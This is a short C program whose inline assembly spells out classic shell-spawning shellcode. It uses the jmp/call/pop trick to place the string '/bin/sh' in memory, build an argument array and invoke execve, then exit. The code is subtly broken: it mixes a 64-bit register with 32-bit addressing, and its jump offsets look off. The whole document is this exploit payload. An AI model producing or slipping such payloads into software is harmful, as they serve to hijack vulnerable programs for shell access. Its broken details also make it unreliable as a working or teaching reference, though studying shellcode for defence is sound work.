
#include<stdio.h>
void main() {
__asm__(
    "jmp 0x2\n"
    "pop %rsi\n"
    "movl %esi,0x8(%esi)\n"
    "xorl %eax,%eax\n"
    "movb $0x0,0x7(%esi)\n"
    "movl %eax,0xc(%esi)\n"
    "movb $0xb,%al\n"
    "movl %esi,%ebx\n"
    "leal 0x8(%esi),%ecx\n"
    "leal 0xc(%esi),%edx\n"
    "int $0x80\n"
    "xorl %ebx,%ebx\n"
    "movl %ebx,%eax\n"
    "inc %eax\n"
    "int $0x80\n"
    "call -0x24\n"
    ".string \"/bin/sh\"\n"
    );
}